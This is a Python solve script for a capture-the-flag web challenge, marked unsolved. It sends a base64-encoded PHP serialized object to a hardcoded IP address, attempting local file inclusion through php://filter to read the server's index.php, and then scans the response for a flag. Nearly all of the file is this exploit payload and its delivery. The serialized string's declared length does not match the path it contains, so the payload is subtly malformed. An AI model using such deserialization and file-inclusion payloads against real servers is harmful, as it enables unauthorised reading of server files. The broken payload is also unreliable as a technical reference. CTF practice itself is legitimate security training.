#!/usr/bin/env python3
"""
Solve script for Challenge #9: Gestor de Respaldos Capybara
PHP deserialization challenge - UNSOLVED.

Best attempt: Inject plantilla property for LFI via php://filter.
The challenge requires finding the correct trigger for the deserialization gadget.
"""

import sys
import requests
import base64
import time

URL = "http://192.99.247.166:8085/"

def solve():
    # Best attempt: plantilla with php://filter to read index.php
    # This assumes Preferencias.__destruct() does include($this->plantilla)
    payload = {
        "tema": "oscuro",
        "plantilla": "php://filter/convert.base64-encode/resource=/var/www/html/public/index.php"
    }
    
    # Serialize as Preferencias object
    serialized = 'O:12:"Preferencias":2:{s:4:"tema";s:6:"oscuro";s:9:"plantilla";s:66:"php://filter/convert.base64-encode/resource=/var/www/html/public/index.php";}'
    encoded = base64.b64encode(serialized.encode()).decode()
    
    # Polite delay
    time.sleep(1)
    
    resp = requests.get(URL, params={"pref": encoded}, timeout=10)
    
    # Search for flag in response
    import re
    flag_match = re.search(r'EVIL\{[^}]+\}', resp.text)
    if flag_match:
        print(flag_match.group(0))
        return 0
    
    # Also check headers and cookies
    for header, value in resp.headers.items():
        flag_match = re.search(r'EVIL\{[^}]+\}', value)
        if flag_match:
            print(flag_match.group(0))
            return 0
    
    print("Challenge unsolved - flag not found with current approach", file=sys.stderr)
    print("Best attempt: plantilla LFI via php://filter", file=sys.stderr)
    print("Hint: <!--AGENT-CAPYBARA-MARO--> in page source", file=sys.stderr)
    return 1

if __name__ == "__main__":
    sys.exit(solve())